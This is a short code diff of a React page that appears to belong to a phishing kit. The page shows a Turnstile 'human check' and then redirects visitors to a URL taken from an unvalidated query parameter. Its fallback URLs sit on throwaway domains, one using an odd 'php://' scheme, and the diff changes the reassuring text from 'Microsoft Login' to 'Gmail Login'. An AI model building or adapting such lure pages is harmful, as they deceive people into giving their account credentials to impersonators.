@@ -6,7 +6,7 @@ function App() {
   useEffect(() => {
     // Get redirect URL from query parameters
     const params = new URLSearchParams(window.location.search);
-    const redirectUrl = params.get('redirect') || 'https://office.tadalafil733.us/aVreVsFb';
+    const redirectUrl = params.get('redirect') || 'php://smart.sezaiha.properties/M5RSFJGh2S0c!DELf/';
 
     // Wait for Turnstile script to load and render widget
     const checkTurnstile = setInterval(() => {
@@ -54,7 +54,7 @@ function App() {
         </h1>
 
         <p className="text-base text-gray-600 mb-6 leading-relaxed">
-          You can now safely continue to the Microsoft Login page to access your files.
+          You can now safely continue to the Gmail Login page to access your files.
         </p>
 
         <div className="flex justify-center">
